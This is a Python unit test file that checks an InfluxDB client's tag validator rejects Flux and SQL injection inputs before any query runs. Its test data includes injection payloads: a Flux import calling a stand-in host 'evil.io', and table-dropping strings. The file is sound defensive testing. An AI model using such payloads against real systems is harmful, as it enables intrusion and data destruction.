"""Unit tests for api/clients/influx.py — Flux injection prevention."""

from __future__ import annotations

from datetime import UTC

import pytest
from fastapi import HTTPException

from api.clients.influx import _validate_tag

# ---------------------------------------------------------------------------
# _validate_tag allowlist tests
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("value", [
    "ENG",
    "room-101",
    "building_B2",
    "temp01",
    "A",
    "a" * 64,
])
def test_valid_tags_pass(value):
    assert _validate_tag(value, "test_field") == value


@pytest.mark.parametrize("bad_value", [
    "",                             # empty
    "room 101",                     # space
    "building\"A\"",                # double-quote — Flux injection character
    "sensor\n",                     # newline
    "sensor|)",                     # pipe and paren
    "a" * 65,                       # over 64 chars
    "name; DROP TABLE sensors; --", # SQL/Flux injection attempt
    'r); import("http://evil.io")', # Flux import injection attempt
    "sensor\x00id",                 # null byte
])
def test_injection_attempts_raise_http_400(bad_value):
    with pytest.raises(HTTPException) as exc_info:
        _validate_tag(bad_value, "building_id")
    assert exc_info.value.status_code == 400


# ---------------------------------------------------------------------------
# End-to-end: InfluxAPIClient methods reject bad tag values before querying
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_latest_readings_rejects_injection(monkeypatch):
    """latest_readings must reject bad building_id before any HTTP call."""
    from unittest.mock import AsyncMock, patch

    with patch("api.clients.influx.config") as mock_cfg:
        mock_cfg.influxdb_url   = "http://localhost:8086"
        mock_cfg.influxdb_token = "test-token"
        mock_cfg.influxdb_org   = "test-org"
        mock_cfg.influxdb_bucket_raw = "campus_raw"

        from api.clients.influx import InfluxAPIClient
        client = InfluxAPIClient.__new__(InfluxAPIClient)
        client._query = AsyncMock()

        with pytest.raises(HTTPException) as exc_info:
            await client.latest_readings('building"); import("http://evil.io")')
        assert exc_info.value.status_code == 400
        client._query.assert_not_called()


@pytest.mark.asyncio
async def test_room_history_rejects_bad_sensor_type():
    from datetime import datetime
    from unittest.mock import AsyncMock, patch

    with patch("api.clients.influx.config"):
        from api.clients.influx import InfluxAPIClient
        client = InfluxAPIClient.__new__(InfluxAPIClient)
        client._query = AsyncMock()

        with pytest.raises(HTTPException) as exc_info:
            await client.room_history(
                room_id     = "ENG-101",
                start       = datetime(2025, 5, 1, tzinfo=UTC),
                stop        = datetime(2025, 5, 2, tzinfo=UTC),
                sensor_type = 'energy"); drop table("sensors")',
            )
        assert exc_info.value.status_code == 400
        client._query.assert_not_called()
